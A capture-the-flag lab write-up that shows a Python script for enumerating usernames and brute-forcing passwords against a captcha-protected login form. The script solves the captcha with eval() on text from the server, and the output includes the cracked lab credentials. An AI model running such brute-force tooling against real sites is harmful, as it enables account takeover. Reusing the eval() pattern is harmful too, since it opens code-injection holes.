![[Pasted image 20230506185950.png]]

# General information

![Securesolacoders](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e3943bd2445e65e56afb7a5/room-content/b5a647b9469643ad859ac93c27dd8e3d.png)

SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly**.**

Before we start, download the required files by pressing the **Download Task Files** button.

![[Pasted image 20230506190235.png]]

# Bypass the login form

 
Please wait approximately 3-5 minutes for the application to start.  
You can find the web application at: **`http://MACHINE_IP`**

## Answer the questions below

What is the value of flag.txt?

**`http://10.10.1.108`**
![[Pasted image 20230506190617.png]]

Testing the login page:
- On test/test
	- Error: The user 'test' does not exist 
- On root/test
	- Error: The user 'root' does not exist 
- On admin/test
	- Error: The user 'root' does not exist 

Configure Burpo to attack username

![[Pasted image 20230506193414.png]]

![[Pasted image 20230506193452.png]]
![[Pasted image 20230506194006.png]]

After several attempt, a Captcha prompt appeared.

![[Pasted image 20230506195209.png]]

At this point, there may be a tool that can handle the Captcha ... but its yet another opportunity to flex the python muscles. Let go!

```python
import requests
import json
import re
import io
from datetime import datetime

login_url = 'http://10.10.1.108/login'
username_file = 'usernames.txt'
password_file = 'passwords.txt'
logging_file = 'logging.txt'
sleep_time_ms = 1000
logging = True

#-----------------------------------------------#

usernames = []
passwords = []

# Init logging file
def InitLog():
    with open(logging_file, 'w') as fd:
        fd.write(f'Starting run at {datetime.now()}')
        fd.write(f'---------------------------------------------------')
InitLog()

# append string to logging file
def log(string2append, print2screen=True):
    with open(logging_file, 'a') as fd:
        fd.write(f'\n{string2append}')
    if print2screen:
        print(string2append)
    
# Open file and read each line into an array
def read_file(filename):
    filestream = io.open(filename, 'r')    
    line_array = filestream.readlines()
    filestream.close()
    return line_array

# connect to web server and POST a request 
# to start a new job
def start_job(url, username, password, captcha=None):
    headers = {'Content-Type': 'application/x-www-form-urlencoded',
               'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    if captcha:
        data = {'username': username, 'password': password, 'captcha': captcha}
    else:
        data = {'username': username, 'password': password}
    response_payload = requests.post(url, headers=headers, data=data)
    #print("Status Code", response_payload.status_code)
    return response_payload.text

# parse the response from the web server and look for a regex string
# if the regex string is found, return True, otherwise return False
def process_response(response_payload, error_regex_string):
    match = re.search(error_regex_string,response_payload)
    if match:
        return True
    return False
    
# function to solve the captcha
def solve_captcha(captcha_regex_string):
    return eval(captcha_regex_string)

# find the catcha in the response using regex
# return the value of the captcha
def process_response_captcha(response_payload, captcha_start_string, catcha_end_string):
    pos_start = response_payload.find(captcha_start_string) + len(captcha_start_string)
    if pos_start == -1:
        return None
    pos_end = response_payload.find(catcha_end_string, pos_start)
    return response_payload[pos_start:pos_end].strip()

################################
username1 = 'test'
password = 'test'
counter = 0
# Read the usernames and passwords from the files
usernames = read_file(username_file)
passwords = read_file(password_file)

# iterate through the usernames 
for username in usernames:
    counter+=1
#    if (counter==10):
#        break
    log(f"-----------------------------------------", False)
    
    username = username.strip()
    password = password.strip()
    
    response = start_job(login_url, username, password)

    # Test for Captha presence and test usernames
    if process_response(response, 'Captcha enabled'):
        #print("Captcha is enabled") 
        
        # Solve the captcha
        captcha_string = process_response_captcha(response, 'Captcha enabled</h3></b></label><br>', ' = ?')
        captcha_value = solve_captcha(captcha_string)
        log(f"Captcha is enabled --> {captcha_string=} is {captcha_value}", False)
        
        # try again with the captcha value
        response = start_job(login_url, username, password, captcha_value)
        log(f"Response is: {response}", False)

        # Test for username
        if process_response(response, 'does not exist'):
            log(f"{counter} The user '{username}' does not exist")
        else:
            log(f"{counter} The user '{username}' found!!!!")
            break
        
    else:
        log("Captcha is not enabled")
        
        # Test for username
        if process_response(response, 'does not exist'):
            log(f"{counter} The user '{username}' does not exist")
        else:
            log(f"{counter} The user '{username}' found!!!!")
            break

```

So the code above iterates through the usernames and tries to login. As it does that, it will test for the captcha prompt. If there is a captcha prompt, it will interpret it and request a login again. Upon finding the valid login via an output change ... we will know :)

```bash
┌──(root㉿kali)-[~/Desktop/capture]
└─# python3 myhydra.py
1 The user 'rachel' does not exist
2 The user 'rodney' does not exist
3 The user 'corrine' does not exist
4 The user 'erik' does not exist
5 The user 'chuck' does not exist
...
302 The user 'solomon' does not exist
303 The user 'dewitt' does not exist
304 The user 'hilario' does not exist
305 The user 'vilma' does not exist
306 The user 'hugh' does not exist
307 The user 'natalie' found!!!!

```

Lets test and see the new error message to expand the code to test for passwords.

![[Pasted image 20230506224919.png]]

The new message is now:
Error: Invalid password for user 'natalie' 

Let roll Autobots!

This is the only snippet of the code I needed to change. It forces username to be our identified username and we then iterate on passwords instead. Later on line 110, I change the processing to output a valid or invalid password. I could make it better ... for later. I want to finish this box.

```python
line 76 (ish)
username = 'natalie'
password = 'test'
counter = 0
# Read the usernames and passwords from the files
usernames = read_file(username_file)
passwords = read_file(password_file)

# iterate through the usernames 
#for username in usernames:
# iterate through the passwords 
for password in passwords:

...
line 110 (ish) and 122 (ish)
        # Test for username
        if process_response(response, 'does not exist'):
            log(f"{counter} The user '{username}' does not exist")
        else:
            # Test for password
            if process_response(response, 'Invalid password for user'):
                log(f"{counter} Invalid password '{password}' for valid user '{username}'")
            else:
                log(f"{counter} >>>>  Valid password '{password}' for user '{username}' <<<<")
                break
```

Lets run it
```bash
──(root㉿kali)-[~/Desktop/capture]
└─# python3 myhydra.py
1 Invalid password 'football' for user 'natalie'
2 Invalid password 'kimberly' for user 'natalie'
3 Invalid password 'mookie' for user 'natalie'
4 Invalid password 'daniel' for user 'natalie'
...
342 Invalid password 'brooke' for user 'natalie'
343 Invalid password '147852369' for user 'natalie'
344 >>>>  Valid password 'sk8board' for user 'natalie' <<<<

```

Lets login and see whats next.

![[Pasted image 20230506224919.png]]

Oh, and thats it folks!

![[Pasted image 20230506230918.png]]